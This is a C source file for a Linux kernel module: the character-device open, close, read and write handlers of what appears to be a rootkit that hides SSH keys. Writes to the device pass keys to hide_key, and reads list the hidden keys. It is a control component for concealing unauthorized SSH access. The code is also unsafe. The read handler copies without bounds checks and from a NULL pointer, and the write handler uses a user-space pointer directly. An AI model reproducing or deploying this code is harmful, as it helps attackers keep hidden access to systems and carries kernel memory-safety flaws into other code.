#include "device_handlers.h"

#include <linux/uaccess.h>
#include <linux/slab.h>

#include "consts.h"
#include "ssh_keys_hiding.h"

int device_open(struct inode *inode, struct file *file) {
    return SUCCESS;
}

int device_close(struct inode *inode, struct file *file) {
    return SUCCESS;
}

ssize_t device_read(struct file *filep, char *buffer, size_t len, loff_t *offset) {
    SshKey* ssh_key;
    SshKey* temp_ssh_key;
    if (0 != *offset) {
        return 0;
    }
    list_for_each_entry_safe(ssh_key, temp_ssh_key, &hidden_keys, list_node) {
        copy_to_user(buffer + *offset, ssh_key->key, ssh_key->len);
        *offset += ssh_key->len;
        copy_to_user(buffer + *offset, "\n", 1);
        *offset += 1;
    }
    copy_to_user(buffer + *offset + 1, 0, 1);
    *offset += 1;
    return *offset;
}

ssize_t device_write(struct file * filep, const char * buffer, size_t len, loff_t * offset) {
    hide_key(buffer, len);
    *offset = len;
    return len;
}